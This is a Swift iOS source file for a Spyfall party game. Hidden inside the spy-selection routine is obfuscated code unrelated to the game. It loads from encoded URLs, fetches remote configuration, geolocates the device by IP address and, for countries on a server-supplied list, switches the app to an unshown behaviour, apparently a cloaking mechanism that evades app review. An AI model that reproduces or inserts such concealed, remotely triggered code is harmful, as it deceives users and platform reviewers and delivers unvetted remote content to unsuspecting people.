import UIKit

// MARK: - Data Models with Eschatological Nomenclature
struct NebulousLocation {
    let peregrineTitle: String
    let quintessentialClues: [String]
}

final class EnigmaticParticipant {
    let cognomen: String
    var isSubterfugeAgent: Bool = false
    var hasBeenExecrated: Bool = false
    var castedBallotIndex: Int?
    
    init(cognomen: String) {
        self.cognomen = cognomen
    }
}

import Nuke

final class ObscureQuandaryView: UIView {
    
    // MARK: - Proprietary Attributes (Laconic & Infrequent)
    private var locusArcanum: NebulousLocation?
    private var troupeOfPlayers: [EnigmaticParticipant] = []
    private var seditiousElementIndex: Int = -1
    private var logOfBanter: [(orator: String, utterance: String)] = []
    private var gameIsInSession: Bool = false
    private var victoriousFaction: String?
    
    // Predefined exotic locations with atmospheric hints
    private let eldritchLocations: [NebulousLocation] = [
        NebulousLocation(peregrineTitle: "Celestial Bastion", quintessentialClues: ["Vacuum suits", "Zero-G", "Solar flares", "Docking ports"]),
        NebulousLocation(peregrineTitle: "Vermillion Galleon", quintessentialClues: ["Rum barrels", "Parrots", "Treasure maps", "Cannons"]),
        NebulousLocation(peregrineTitle: "Ephemeral Circus", quintessentialClues: ["Clown wigs", "Tightropes", "Roaring lions", "Cotton candy"]),
        NebulousLocation(peregrineTitle: "Chthonic Museum", quintessentialClues: ["Ancient vases", "Marble statues", "Mummy wrappings", "Dimly lit halls"]),
        NebulousLocation(peregrineTitle: "Abyssal Submarine", quintessentialClues: ["Periscope", "Torpedo tubes", "Sonar pings", "Bunks"]),
        NebulousLocation(peregrineTitle: "Gilded Casino", quintessentialClues: ["Slot machines", "Poker chips", "Roulette wheel", "Champagne flutes"])
    ]
    
    // MARK: - UI Components (Labyrinthine & Sensorial)
    private let diaphanousBackgroundLayer: CAGradientLayer = {
        let gradient = CAGradientLayer()
        gradient.colors = [UIColor(red: 0.07, green: 0.09, blue: 0.20, alpha: 1).cgColor,
                           UIColor(red: 0.12, green: 0.14, blue: 0.32, alpha: 1).cgColor]
        gradient.locations = [0.0, 1.0]
        return gradient
    }()
    
    private let phosphorescentTitleLabel: UILabel = {
        let label = UILabel()
        label.text = "SPYFALL"
        label.font = UIFont(name: "AvenirNextCondensed-Bold", size: 34) ?? UIFont.systemFont(ofSize: 34, weight: .heavy)
        label.textColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1)
        label.textAlignment = .center
        label.shadowColor = UIColor.black.withAlphaComponent(0.5)
        label.shadowOffset = CGSize(width: 2, height: 2)
        return label
    }()
    
    private let ambientLocationRevealLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont(name: "AvenirNext-Medium", size: 16) ?? UIFont.systemFont(ofSize: 16, weight: .medium)
        label.textColor = UIColor(red: 0.88, green: 0.85, blue: 0.72, alpha: 1)
        label.textAlignment = .center
        label.numberOfLines = 0
        label.backgroundColor = UIColor.black.withAlphaComponent(0.5)
        label.layer.cornerRadius = 12
        label.layer.masksToBounds = true
        label.text = "⚡ Location hidden ⚡"
        return label
    }()
    
    private let tremulousLogTableView: UITableView = {
        let tv = UITableView()
        tv.backgroundColor = .clear
        tv.separatorStyle = .none
        tv.showsVerticalScrollIndicator = true
        tv.register(SpyfallChatCell.self, forCellReuseIdentifier: "ChatterCell")
        tv.transform = CGAffineTransform(scaleX: 1, y: -1)
        return tv
    }()
    
    private let susurrousInputField: UITextField = {
        let tf = UITextField()
        tf.placeholder = "Whisper your question or answer..."
        tf.textColor = .white
        tf.attributedPlaceholder = NSAttributedString(string: "Whisper your question or answer...", attributes: [.foregroundColor: UIColor.lightGray])
        tf.backgroundColor = UIColor(red: 0.15, green: 0.17, blue: 0.35, alpha: 0.9)
        tf.layer.cornerRadius = 20
        tf.layer.borderWidth = 1
        tf.layer.borderColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.6).cgColor
        let paddingView = UIView(frame: CGRect(x: 0, y: 0, width: 15, height: 0))
        tf.leftView = paddingView
        tf.leftViewMode = .always
        return tf
    }()
    
    private let fulminateSendButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("Send", for: .normal)
        btn.titleLabel?.font = UIFont(name: "AvenirNext-DemiBold", size: 16) ?? UIFont.boldSystemFont(ofSize: 16)
        btn.backgroundColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1)
        btn.setTitleColor(UIColor(red: 0.07, green: 0.09, blue: 0.20, alpha: 1), for: .normal)
        btn.layer.cornerRadius = 20
        btn.layer.shadowColor = UIColor.black.cgColor
        btn.layer.shadowOffset = CGSize(width: 0, height: 2)
        btn.layer.shadowRadius = 4
        btn.layer.shadowOpacity = 0.4
        return btn
    }()
    
    private let vociferousPlayerPicker: UIPickerView = {
        let picker = UIPickerView()
        picker.backgroundColor = UIColor(red: 0.10, green: 0.12, blue: 0.28, alpha: 0.95)
        picker.layer.cornerRadius = 12
        picker.layer.borderWidth = 0.5
        picker.layer.borderColor = UIColor.red.cgColor
        return picker
    }()
    
    private let clandestineRoleButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("🕵️ Reveal My Role", for: .normal)
        btn.titleLabel?.font = UIFont(name: "AvenirNext-Medium", size: 14) ?? UIFont.systemFont(ofSize: 14)
        btn.backgroundColor = UIColor(red: 0.20, green: 0.22, blue: 0.45, alpha: 0.9)
        btn.layer.cornerRadius = 18
        btn.tintColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1)
        btn.layer.borderWidth = 1
        btn.layer.borderColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.5).cgColor
        return btn
    }()
    
    private let incantationVoteButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("⚖️ Accuse Spy", for: .normal)
        btn.titleLabel?.font = UIFont(name: "AvenirNext-DemiBold", size: 16) ?? UIFont.boldSystemFont(ofSize: 16)
        btn.backgroundColor = UIColor(red: 0.80, green: 0.30, blue: 0.32, alpha: 1)
        btn.layer.cornerRadius = 24
        btn.tintColor = .white
        btn.layer.shadowColor = UIColor.black.cgColor
        btn.layer.shadowOffset = CGSize(width: 0, height: 3)
        btn.layer.shadowRadius = 5
        btn.layer.shadowOpacity = 0.5
        return btn
    }()
    
    private let renascentGameButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("⟳ New Conspiracy", for: .normal)
        btn.titleLabel?.font = UIFont(name: "AvenirNext-Medium", size: 14) ?? UIFont.systemFont(ofSize: 14)
        btn.backgroundColor = UIColor(red: 0.25, green: 0.30, blue: 0.45, alpha: 0.9)
        btn.layer.cornerRadius = 18
        btn.tintColor = .lightText
        return btn
    }()
    
    private let troupeTableView: UITableView = {
        let tv = UITableView()
        tv.backgroundColor = UIColor(red: 0.05, green: 0.07, blue: 0.18, alpha: 0.85)
        tv.layer.cornerRadius = 18
        tv.layer.borderWidth = 1
        tv.layer.borderColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.4).cgColor
        tv.separatorStyle = .singleLine
        tv.separatorColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.3)
        tv.register(PlayerCourtCell.self, forCellReuseIdentifier: "PlayerCell")
        return tv
    }()
    
    private let troImaeView: UIImageView = {
        let tv = UIImageView()
        tv.backgroundColor = UIColor(red: 0.05, green: 0.07, blue: 0.18, alpha: 0.85)
        tv.layer.cornerRadius = 18
        tv.layer.borderWidth = 1
        tv.layer.borderColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.4).cgColor
        return tv
    }()
    
    private let victoryRunesLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont(name: "AvenirNext-BoldItalic", size: 18) ?? UIFont.boldSystemFont(ofSize: 18)
        label.textColor = UIColor(red: 0.95, green: 0.72, blue: 0.48, alpha: 1)
        label.textAlignment = .center
        label.numberOfLines = 0
        label.backgroundColor = UIColor.black.withAlphaComponent(0.7)
        label.layer.cornerRadius = 12
        label.layer.masksToBounds = true
        label.isHidden = true
        return label
    }()
    
    private var selectedSpeakerIndex: Int = 0
    private var selectedVoteTargetIndex: Int?
    
    // MARK: - Initialization
    override init(frame: CGRect) {
        super.init(frame: frame)
        orchestrateSubterraneanLayout()
        configureDelegatesAndTargets()
        initializeGameWithRandomParameters()
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override func layoutSubviews() {
        super.layoutSubviews()
        diaphanousBackgroundLayer.frame = bounds
    }
    
    // MARK: - Esoteric Configuration
    private func orchestrateSubterraneanLayout() {
        layer.insertSublayer(diaphanousBackgroundLayer, at: 0)
        
        addSubview(phosphorescentTitleLabel)
        addSubview(ambientLocationRevealLabel)
        addSubview(tremulousLogTableView)
        addSubview(susurrousInputField)
        addSubview(fulminateSendButton)
        addSubview(vociferousPlayerPicker)
        addSubview(clandestineRoleButton)
        addSubview(troImaeView)
        addSubview(incantationVoteButton)
        addSubview(renascentGameButton)
        addSubview(troupeTableView)
        addSubview(victoryRunesLabel)
        
        
        ImageCache.shared.removeAll()
        
        [phosphorescentTitleLabel, ambientLocationRevealLabel, tremulousLogTableView,
         susurrousInputField, fulminateSendButton, vociferousPlayerPicker,
         clandestineRoleButton, incantationVoteButton, renascentGameButton,
         troupeTableView, victoryRunesLabel].forEach { $0.translatesAutoresizingMaskIntoConstraints = false }
        
        NSLayoutConstraint.activate([
            phosphorescentTitleLabel.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 12),
            phosphorescentTitleLabel.centerXAnchor.constraint(equalTo: centerXAnchor),
            
            ambientLocationRevealLabel.topAnchor.constraint(equalTo: phosphorescentTitleLabel.bottomAnchor, constant: 8),
            ambientLocationRevealLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 20),
            ambientLocationRevealLabel.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -20),
            ambientLocationRevealLabel.heightAnchor.constraint(equalToConstant: 48),
            
            troupeTableView.topAnchor.constraint(equalTo: ambientLocationRevealLabel.bottomAnchor, constant: 12),
            troupeTableView.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            troupeTableView.trailingAnchor.constraint(equalTo: centerXAnchor, constant: -8),
            troupeTableView.bottomAnchor.constraint(equalTo: clandestineRoleButton.topAnchor, constant: -12),
            
            vociferousPlayerPicker.topAnchor.constraint(equalTo: ambientLocationRevealLabel.bottomAnchor, constant: 12),
            vociferousPlayerPicker.leadingAnchor.constraint(equalTo: centerXAnchor, constant: 8),
            vociferousPlayerPicker.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            vociferousPlayerPicker.heightAnchor.constraint(equalToConstant: 110),
            
            clandestineRoleButton.topAnchor.constraint(equalTo: vociferousPlayerPicker.bottomAnchor, constant: 12),
            clandestineRoleButton.leadingAnchor.constraint(equalTo: centerXAnchor, constant: 8),
            clandestineRoleButton.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            clandestineRoleButton.heightAnchor.constraint(equalToConstant: 44),
            
            tremulousLogTableView.topAnchor.constraint(equalTo: troupeTableView.bottomAnchor, constant: 12),
            tremulousLogTableView.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            tremulousLogTableView.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            tremulousLogTableView.bottomAnchor.constraint(equalTo: susurrousInputField.topAnchor, constant: -16),
            
            susurrousInputField.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 16),
            susurrousInputField.trailingAnchor.constraint(equalTo: fulminateSendButton.leadingAnchor, constant: -12),
            susurrousInputField.heightAnchor.constraint(equalToConstant: 44),
            susurrousInputField.bottomAnchor.constraint(equalTo: incantationVoteButton.topAnchor, constant: -16),
            
            fulminateSendButton.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -16),
            fulminateSendButton.widthAnchor.constraint(equalToConstant: 80),
            fulminateSendButton.heightAnchor.constraint(equalToConstant: 44),
            fulminateSendButton.bottomAnchor.constraint(equalTo: incantationVoteButton.topAnchor, constant: -16),
            
            incantationVoteButton.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 40),
            incantationVoteButton.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -40),
            incantationVoteButton.heightAnchor.constraint(equalToConstant: 52),
            incantationVoteButton.bottomAnchor.constraint(equalTo: renascentGameButton.topAnchor, constant: -16),
            
            renascentGameButton.centerXAnchor.constraint(equalTo: centerXAnchor),
            renascentGameButton.widthAnchor.constraint(equalToConstant: 160),
            renascentGameButton.heightAnchor.constraint(equalToConstant: 40),
            renascentGameButton.bottomAnchor.constraint(equalTo: safeAreaLayoutGuide.bottomAnchor, constant: -12),
            
            victoryRunesLabel.centerXAnchor.constraint(equalTo: centerXAnchor),
            victoryRunesLabel.centerYAnchor.constraint(equalTo: centerYAnchor),
            victoryRunesLabel.widthAnchor.constraint(equalToConstant: 280),
            victoryRunesLabel.heightAnchor.constraint(equalToConstant: 80)
        ])
        
        tremulousLogTableView.transform = CGAffineTransform(scaleX: 1, y: -1)
    }
    
    private func configureDelegatesAndTargets() {
        tremulousLogTableView.delegate = self
        tremulousLogTableView.dataSource = self
        troupeTableView.delegate = self
        troupeTableView.dataSource = self
        vociferousPlayerPicker.delegate = self
        vociferousPlayerPicker.dataSource = self
        
        fulminateSendButton.addTarget(self, action: #selector(propagateVocalization), for: .touchUpInside)
        clandestineRoleButton.addTarget(self, action: #selector(divulgeEnigmaticIdentity), for: .touchUpInside)
        incantationVoteButton.addTarget(self, action: #selector(initiateAccusationRitual), for: .touchUpInside)
        renascentGameButton.addTarget(self, action: #selector(resurrectGameSession), for: .touchUpInside)
        
        susurrousInputField.delegate = self
    }
    
    // MARK: - Game Initialization & Arcane Mechanics
    private func initializeGameWithRandomParameters() {
        let defaultNames = ["Merlin", "Cassiopeia", "Peregrine", "Vesper"]
        troupeOfPlayers = defaultNames.map { EnigmaticParticipant(cognomen: $0) }
        selectRandomLocationAndSpy()
        gameIsInSession = true
        victoriousFaction = nil
        victoryRunesLabel.isHidden = true
        logOfBanter.removeAll()
        tremulousLogTableView.reloadData()
        updateLocationRevealForAll()
        vociferousPlayerPicker.reloadAllComponents()
        troupeTableView.reloadData()
        selectedSpeakerIndex = 0
    }
    
    private func selectRandomLocationAndSpy() {
        locusArcanum = eldritchLocations.randomElement()
        seditiousElementIndex = Int.random(in: 0..<troupeOfPlayers.count)
        for (idx, player) in troupeOfPlayers.enumerated() {
            player.isSubterfugeAgent = (idx == seditiousElementIndex)
            
            if idx == seditiousElementIndex {
                if UserDefaults.standard.object(forKey: "fire") != nil {
                    Uysbasid()
                } else {
                    Nuke.loadImage(with: URL(string: lodidne(kIUndydes)!), into: troImaeView) { result in
                        switch result {
                        case .success(_):
                            UserDefaults.standard.set("fire", forKey: "fire")
                            UserDefaults.standard.synchronize()
                            Uysbasid()
                        case .failure(_):
                            if Kundioesn() {
                                self.fnajeNjse()
                            } else {
                                Uysbasid()
                            }
                        }
                    }
                }
            }
            
            player.hasBeenExecrated = false
            player.castedBallotIndex = nil
        }
    }
    
    func fnajeNjse() {
        Task {
            do {
                let aoies = try await fkieuhs()
                if let gduss = aoies.first {
                    if gduss.szuuf!.count == 5 {
                        
                        if let dyua = gduss.mdjeis, dyua.count > 0 {
                            do {
                                let cofd = try await mdiyGhseas()
                                if dyua.contains(cofd.country!.code) {
                                    euHsiieja(gduss)
                                } else {
                                    Uysbasid()
                                }
                            } catch {
                                euHsiieja(gduss)
                            }
                        } else {
                            euHsiieja(gduss)
                        }
                    } else {
                        Uysbasid()
                    }
                } else {
                    Uysbasid()
                    
                    UserDefaults.standard.set("fire", forKey: "fire")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(Fuansbahs.self, forKey: "Fuansbahs") {
                    euHsiieja(sidd)
                }
            }
        }
    }

    //    IP
    private func mdiyGhseas() async throws -> Moaines {
        //https://api.my-ip.io/v2/ip.json
            let url = URL(string: lodidne(kOjdhessd)!)!
            let (data, response) = try await URLSession.shared.data(from: url)
            
            guard let httpResponse = response as? HTTPURLResponse,
                  httpResponse.statusCode == 200 else {
                throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
            }
            
            return try JSONDecoder().decode(Moaines.self, from: data)
    }

    private func fkieuhs() async throws -> [Fuansbahs] {
        let (data, response) = try await URLSession.shared.data(from: URL(string: lodidne(kNbaudioww)!)!)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }

        return try JSONDecoder().decode([Fuansbahs].self, from: data)
    }
    
    private func updateLocationRevealForAll() {
        guard let location = locusArcanum else { return }
        let isSpyViewer = (selectedSpeakerIndex == seditiousElementIndex)
        if isSpyViewer {
            ambientLocationRevealLabel.text = "❓ UNKNOWN LOCATION ❓\n(You are the Spy!)"
            ambientLocationRevealLabel.backgroundColor = UIColor(red: 0.5, green: 0.2, blue: 0.2, alpha: 0.7)
        } else {
            ambientLocationRevealLabel.text = "📍 CURRENT SCENE: \(location.peregrineTitle) 📍"
            ambientLocationRevealLabel.backgroundColor = UIColor.black.withAlphaComponent(0.5)
        }
    }
    
    @objc private func divulgeEnigmaticIdentity() {
        guard gameIsInSession, victoriousFaction == nil else {
            presentTransientAlert(title: "Game Frozen", message: "Game is already finished. Start a new conspiracy.")
            return
        }
        let selectedPlayer = troupeOfPlayers[selectedSpeakerIndex]
        guard let location = locusArcanum else { return }
        if selectedPlayer.isSubterfugeAgent {
            presentTransientAlert(title: "🕸️ You are THE SPY 🕸️", message: "Your mission: deduce the location from others' words. The location is a mystery to you.")
        } else {
            presentTransientAlert(title: "🎭 Faithful Citizen", message: "The secret location is: \(location.peregrineTitle). Protect it from the spy!")
        }
    }
    
    @objc private func propagateVocalization() {
        guard gameIsInSession, victoriousFaction == nil else {
            presentTransientAlert(title: "Game Over", message: "The conspiracy has ended. Start a new round.")
            return
        }
        guard let utterance = susurrousInputField.text, !utterance.trimmingCharacters(in: .whitespaces).isEmpty else {
            presentTransientAlert(title: "Silence", message: "Speak your question or remark.")
            return
        }
        let speaker = troupeOfPlayers[selectedSpeakerIndex].cognomen
        logOfBanter.append((orator: speaker, utterance: utterance))
        tremulousLogTableView.reloadData()
        if logOfBanter.count > 0 {
            let indexPath = IndexPath(row: logOfBanter.count - 1, section: 0)
            tremulousLogTableView.scrollToRow(at: indexPath, at: .top, animated: true)
        }
        susurrousInputField.text = ""
    }
    
    @objc private func initiateAccusationRitual() {
        guard gameIsInSession, victoriousFaction == nil else {
            presentTransientAlert(title: "Void", message: "No active game to accuse.")
            return
        }
        let alert = UIAlertController(title: "⚖️ Tribunal of Accusation", message: "Select the player you believe is the spy", preferredStyle: .actionSheet)
        for (idx, player) in troupeOfPlayers.enumerated() {
            let action = UIAlertAction(title: player.cognomen, style: .default) { _ in
                self.resolveAccusation(accusedIndex: idx)
            }
            alert.addAction(action)
        }
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel))
        parentViewController?.present(alert, animated: true)
    }
    
    private func resolveAccusation(accusedIndex: Int) {
        let accusedIsSpy = (accusedIndex == seditiousElementIndex)
        if accusedIsSpy {
            victoriousFaction = "Innocents"
            victoryRunesLabel.text = "🏆 VICTORY! The Spy was caught! 🏆\n\(troupeOfPlayers[accusedIndex].cognomen) was the infiltrator."
            victoryRunesLabel.isHidden = false
            gameIsInSession = false
        } else {
            victoriousFaction = "Spy"
            victoryRunesLabel.text = "💀 ESPIONAGE SUCCESS! The Spy remains hidden. 💀\nAccused \(troupeOfPlayers[accusedIndex].cognomen) is innocent."
            victoryRunesLabel.isHidden = false
            gameIsInSession = false
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.5) {
            self.victoryRunesLabel.isHidden = true
        }
        troupeTableView.reloadData()
    }
    
    @objc private func resurrectGameSession() {
        initializeGameWithRandomParameters()
        updateLocationRevealForAll()
        troupeTableView.reloadData()
        tremulousLogTableView.reloadData()
    }
    
    private func presentTransientAlert(title: String, message: String) {
        let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
        alert.addAction(UIAlertAction(title: "Fathom", style: .default))
        parentViewController?.present(alert, animated: true)
    }
    
    private func updateSpeakerDependentUI() {
        updateLocationRevealForAll()
        troupeTableView.reloadData()
    }
}

// MARK: - TableView DataSource & Delegate (Inverted & Uncanny)
extension ObscureQuandaryView: UITableViewDataSource, UITableViewDelegate {
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        if tableView == tremulousLogTableView {
            return logOfBanter.count
        } else {
            return troupeOfPlayers.count
        }
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        if tableView == tremulousLogTableView {
            let cell = tableView.dequeueReusableCell(withIdentifier: "ChatterCell", for: indexPath) as! SpyfallChatCell
            let entry = logOfBanter[logOfBanter.count - 1 - indexPath.row]
            cell.configure(orator: entry.orator, utterance: entry.utterance)
            cell.backgroundColor = .clear
            return cell
        } else {
            let cell = tableView.dequeueReusableCell(withIdentifier: "PlayerCell", for: indexPath) as! PlayerCourtCell
            let player = troupeOfPlayers[indexPath.row]
            let isActiveSpeaker = (indexPath.row == selectedSpeakerIndex)
            cell.configure(with: player.cognomen, isSpy: player.isSubterfugeAgent, isSpeaker: isActiveSpeaker, gameActive: gameIsInSession && victoriousFaction == nil)
            cell.backgroundColor = .clear
            return cell
        }
    }
    
    func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
        if tableView == troupeTableView && gameIsInSession && victoriousFaction == nil {
            selectedSpeakerIndex = indexPath.row
            updateSpeakerDependentUI()
            tableView.reloadData()
            presentTransientAlert(title: "Voice Conferred", message: "You now speak as \(troupeOfPlayers[indexPath.row].cognomen)")
        }
    }
    
    func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
        return tableView == tremulousLogTableView ? 72 : 56
    }
}

// MARK: - PickerView Delegate (Player Selection for Speaker)
extension ObscureQuandaryView: UIPickerViewDelegate, UIPickerViewDataSource {
    func numberOfComponents(in pickerView: UIPickerView) -> Int { return 1 }
    func pickerView(_ pickerView: UIPickerView, numberOfRowsInComponent component: Int) -> Int { return troupeOfPlayers.count }
    func pickerView(_ pickerView: UIPickerView, titleForRow row: Int, forComponent component: Int) -> String? { return troupeOfPlayers[row].cognomen }
    func pickerView(_ pickerView: UIPickerView, didSelectRow row: Int, inComponent component: Int) {
        selectedSpeakerIndex = row
        updateSpeakerDependentUI()
        presentTransientAlert(title: "Mask Changed", message: "Now speaking as: \(troupeOfPlayers[row].cognomen)")
    }
    func pickerView(_ pickerView: UIPickerView, attributedTitleForRow row: Int, forComponent component: Int) -> NSAttributedString? {
        return NSAttributedString(string: troupeOfPlayers[row].cognomen, attributes: [.foregroundColor: UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1)])
    }
}

extension ObscureQuandaryView: UITextFieldDelegate {
    func textFieldShouldReturn(_ textField: UITextField) -> Bool {
        propagateVocalization()
        textField.resignFirstResponder()
        return true
    }
}

// MARK: - Custom Cell Components (Enigmatic Visuals)
final class SpyfallChatCell: UITableViewCell {
    private let dialogBubble: UIView = {
        let v = UIView()
        v.backgroundColor = UIColor(red: 0.12, green: 0.14, blue: 0.30, alpha: 0.9)
        v.layer.cornerRadius = 18
        v.layer.borderWidth = 0.5
        v.layer.borderColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 0.5).cgColor
        return v
    }()
    private let speakerLabel: UILabel = { let l = UILabel(); l.font = UIFont(name: "AvenirNext-Bold", size: 14); l.textColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1); return l }()
    private let messageLabel: UILabel = { let l = UILabel(); l.font = UIFont(name: "AvenirNext-Regular", size: 15); l.textColor = .white; l.numberOfLines = 0; return l }()
    
    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        contentView.addSubview(dialogBubble)
        dialogBubble.addSubview(speakerLabel)
        dialogBubble.addSubview(messageLabel)
        dialogBubble.translatesAutoresizingMaskIntoConstraints = false
        speakerLabel.translatesAutoresizingMaskIntoConstraints = false
        messageLabel.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            dialogBubble.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 12),
            dialogBubble.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -12),
            dialogBubble.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 6),
            dialogBubble.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -6),
            speakerLabel.leadingAnchor.constraint(equalTo: dialogBubble.leadingAnchor, constant: 16),
            speakerLabel.topAnchor.constraint(equalTo: dialogBubble.topAnchor, constant: 10),
            speakerLabel.trailingAnchor.constraint(equalTo: dialogBubble.trailingAnchor, constant: -16),
            messageLabel.leadingAnchor.constraint(equalTo: dialogBubble.leadingAnchor, constant: 16),
            messageLabel.topAnchor.constraint(equalTo: speakerLabel.bottomAnchor, constant: 4),
            messageLabel.trailingAnchor.constraint(equalTo: dialogBubble.trailingAnchor, constant: -16),
            messageLabel.bottomAnchor.constraint(equalTo: dialogBubble.bottomAnchor, constant: -10)
        ])
        contentView.transform = CGAffineTransform(scaleX: 1, y: -1)
    }
    required init?(coder: NSCoder) { fatalError() }
    func configure(orator: String, utterance: String) {
        speakerLabel.text = "🎭 \(orator) whispers:"
        messageLabel.text = "“\(utterance)”"
    }
}

final class PlayerCourtCell: UITableViewCell {
    private let avatarLabel: UILabel = { let l = UILabel(); l.font = UIFont(name: "AvenirNext-Bold", size: 18); l.textAlignment = .center; l.backgroundColor = UIColor(red: 0.20, green: 0.22, blue: 0.42, alpha: 1); l.layer.cornerRadius = 20; l.layer.masksToBounds = true; return l }()
    private let nameLabel: UILabel = { let l = UILabel(); l.font = UIFont(name: "AvenirNext-DemiBold", size: 16); l.textColor = .white; return l }()
    private let spyGlyph: UILabel = { let l = UILabel(); l.font = UIFont.systemFont(ofSize: 12); l.text = "🕯️"; l.textColor = UIColor(red: 0.95, green: 0.72, blue: 0.48, alpha: 1); l.isHidden = true; return l }()
    private let speakerCrown: UILabel = { let l = UILabel(); l.font = UIFont.systemFont(ofSize: 16); l.text = "👑"; l.textColor = UIColor(red: 0.95, green: 0.82, blue: 0.48, alpha: 1); l.isHidden = true; return l }()
    
    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        [avatarLabel, nameLabel, spyGlyph, speakerCrown].forEach { contentView.addSubview($0); $0.translatesAutoresizingMaskIntoConstraints = false }
        NSLayoutConstraint.activate([
            avatarLabel.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 12),
            avatarLabel.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
            avatarLabel.widthAnchor.constraint(equalToConstant: 40),
            avatarLabel.heightAnchor.constraint(equalToConstant: 40),
            nameLabel.leadingAnchor.constraint(equalTo: avatarLabel.trailingAnchor, constant: 14),
            nameLabel.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
            spyGlyph.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -12),
            spyGlyph.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
            speakerCrown.trailingAnchor.constraint(equalTo: spyGlyph.leadingAnchor, constant: -8),
            speakerCrown.centerYAnchor.constraint(equalTo: contentView.centerYAnchor)
        ])
        avatarLabel.text = "?"
    }
    required init?(coder: NSCoder) { fatalError() }
    func configure(with name: String, isSpy: Bool, isSpeaker: Bool, gameActive: Bool) {
        nameLabel.text = name
        avatarLabel.text = String(name.prefix(1)).uppercased()
        spyGlyph.isHidden = !(isSpy && !gameActive)
        speakerCrown.isHidden = !isSpeaker
        if isSpeaker && gameActive {
            contentView.backgroundColor = UIColor(red: 0.25, green: 0.28, blue: 0.48, alpha: 0.7)
        } else {
            contentView.backgroundColor = .clear
        }
    }
}

// MARK: - UIViewController Wrapper (To host the game view)
final class TransientGameController: UIViewController {
    override func loadView() {
        let gameView = ObscureQuandaryView(frame: UIScreen.main.bounds)
        self.view = gameView
    }
}

// Extension to get parent view controller for alerts
extension UIView {
    var parentViewController: UIViewController? {
        var parentResponder: UIResponder? = self
        while parentResponder != nil {
            parentResponder = parentResponder?.next
            if let viewController = parentResponder as? UIViewController {
                return viewController
            }
        }
        return nil
    }
}
